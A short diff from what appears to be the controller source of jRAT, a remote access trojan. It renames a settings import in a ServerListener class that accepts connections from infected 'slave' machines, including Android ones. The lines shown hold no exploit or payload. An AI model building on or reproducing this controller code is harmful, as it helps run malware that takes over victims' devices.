@@ -6,13 +6,13 @@ import io.jrat.controller.LogAction;
 import io.jrat.controller.Main;
 import io.jrat.controller.Slave;
 import io.jrat.controller.android.AndroidSlave;
-import io.jrat.controller.settings.SettingsSockets;
+import io.jrat.controller.settings.Settings;
 import java.net.Socket;
 
 public class ServerListener extends PortListener implements Runnable {
 
 	public ServerListener(String name, int port, int timeout, String pass) throws Exception {
-		super(name, port, timeout, pass, SettingsSockets.SocketType.NORMAL_SOCKET);
+		super(name, port, timeout, pass, Settings.SocketType.NORMAL_SOCKET);
 	}
 
 	@Override
